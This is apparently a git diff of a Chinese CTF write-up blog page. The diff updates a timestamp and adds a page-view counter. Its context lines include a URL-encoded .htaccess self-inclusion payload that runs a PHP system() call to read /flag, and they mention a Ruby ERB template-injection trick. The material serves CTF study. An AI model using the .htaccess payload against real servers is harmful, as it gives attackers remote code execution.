@@ -29,7 +29,7 @@
 <meta property="og:image" content="http://yoursite.com/images/BUUCTF3/image-20201128000510021.png">
 <meta property="og:image" content="http://yoursite.com/images/BUUCTF3/image-20201128000241825.png">
 <meta property="og:image" content="http://yoursite.com/images/BUUCTF3/image-20201128175030199.png">
-<meta property="og:updated_time" content="2021-01-25T14:57:42.634Z">
+<meta property="og:updated_time" content="2021-02-03T07:21:07.452Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BUUCTF2">
 <meta name="twitter:description" content="[SCTF2019]Flag Shoprobots.txt中有源码，发现/work路由中存在rubyREB模板注入但是长度限制为7，这里需要用到[预定义变量]&amp;#40;https://blog.csdn.net/TomorrowAndTuture/article/details/108565910&amp;#41;`$&amp;#39;`,表示的是最后一次模式匹配中匹配部分之后的字符串，也就是说match方法会将">
@@ -402,6 +402,7 @@
 <h2 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h2><p>利用.htaccess自包含执行PHP代码。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value%20auto_prepend_fil%5C%0Ae%20.htaccess%0A%23%3C%3Fphp%20system&amp;#40;&apos;cat%20%2Fflag&apos;&amp;#41;%3B%3F%3E%0A%23%5C</span><br></pre></td></tr></table></figure>
 
+<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
 
       
 
